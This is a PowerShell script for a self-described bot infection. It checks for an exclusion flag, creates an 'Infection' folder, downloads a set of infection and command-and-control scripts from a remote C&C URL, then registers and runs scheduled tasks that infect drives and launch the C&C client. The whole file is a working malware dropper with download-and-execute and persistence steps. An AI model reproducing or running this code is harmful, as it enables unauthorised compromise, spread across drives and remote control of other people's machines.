# The name of the folder where the files for our bot will live
$infectiondir = "Infection"
# Infection Exclusion Flag
$infectionexflag = "Infection.Not"
# System Drive letter
$sysdrive = (Get-ChildItem env:systemdrive).value
# Infection exclusion path
$infectionexpath = Join-Path $sysdrive $infectionexflag
# infection path
$infectionpath = Join-Path $sysdrive $infectiondir
#Is the system infected?
$pcinfected = Test-Path $infectionpath
#if the PC isn't infected
if((!$pcinfected) -and (!(Test-Path $infectionexpath))) {
	# make directory 
	mkdir $infectionpath
	#URl to get files from
	$webinfect = "https://candc.cloudapp.net/webinfect/"
	#create a new webclient object
	$wc = New-Object Net.WebClient
	#list of files to download
	$filestodownload = "Infect-Drives.ps1", "Infect-PC.ps1", "Invoke-CandC.ps1", "InvokeCandC.xml", "InfectDrives.xml"
	#download each file
	foreach ($file in $filestodownload) {
		$fileurl = $webinfect + $file
		$destpath = $infectionpath + "\" + $file
		"downloading $fileurl to $destpath"
		$wc.downloadfile($fileurl, $destpath)
	}
	
	# create Infect-Drives scheduled task and run it
	schtasks /create /xml c:\infection\InfectDrives.xml /tn InfectDrives
	schtasks /run /TN InfectDrives
	# create Invoke-CandC scheduled task and run it
	schtasks /create /xml c:\infection\InvokeCandC.xml /tn InvokeCandC
	schtasks /run /TN InvokeCandC
}

